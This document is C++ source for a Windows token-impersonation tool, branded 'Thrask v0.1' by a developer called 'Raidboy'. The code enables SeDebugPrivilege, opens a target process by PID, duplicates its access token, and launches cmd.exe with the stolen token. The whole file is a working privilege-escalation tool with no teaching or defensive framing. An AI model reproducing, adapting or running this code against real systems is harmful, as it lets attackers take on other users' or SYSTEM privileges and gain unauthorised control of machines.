#include <windows.h>
#include <iostream>

BOOL setPrivilege(LPCTSTR priv) {
    HANDLE token;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    BOOL res = TRUE;

    if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token)) res = FALSE;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), NULL, NULL)) res = FALSE;

    std::cout << (res ? "Thrask: enable " : "Thrask: failed to enable ") << priv << (res ? " [1]" : " [0]") << std::endl;
    return res;
}

HANDLE getToken(DWORD pid) {
    HANDLE cToken = NULL;
    HANDLE ph = (pid == 0) ? GetCurrentProcess() : OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, pid);

    std::cout << (ph ? "Thrask: got process handle [1]" : "Thrask: failed to get process handle [0]") << std::endl;

    BOOL res = OpenProcessToken(ph, MAXIMUM_ALLOWED, &cToken);

    std::cout << ((res && cToken) ? "Thrask: got access token [1]" : "Thrask: failed to get access token [0]") << std::endl;

    return (res && cToken) ? cToken : NULL;
}

BOOL createProcess(HANDLE token, LPCWSTR app) {
    HANDLE dToken = NULL;
    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi = { 0 };

    BOOL res = DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &dToken);
    std::cout << (res ? "Thrask: duplicated token [1]" : "Thrask: failed to duplicate token [0]") << std::endl;

    res = CreateProcessWithTokenW(dToken, LOGON_WITH_PROFILE, app, NULL, 0, NULL, NULL, &si, &pi);
    std::cout << (res ? "Thrask: process created [1]" : "Thrask: failed to create process [0]") << std::endl;

    return res;
}

int main(int argc, char** argv) {
    if (argc < 2) {
        std::cout << "Thrask: usage: " << argv[0] << " <pid>" << std::endl;
        return -1;
    }
    std::cout << "Dev: Raidboy, Thrask v0.1\n\n";

    if (!setPrivilege(SE_DEBUG_NAME)) return -1;

    DWORD pid = atoi(argv[1]);
    HANDLE cToken = getToken(pid);
    if (!cToken) return -1;

    // target cmd.exe
    if (!createProcess(cToken, L"C:\\Windows\\System32\\cmd.exe")) return -1;

    return 0;
}
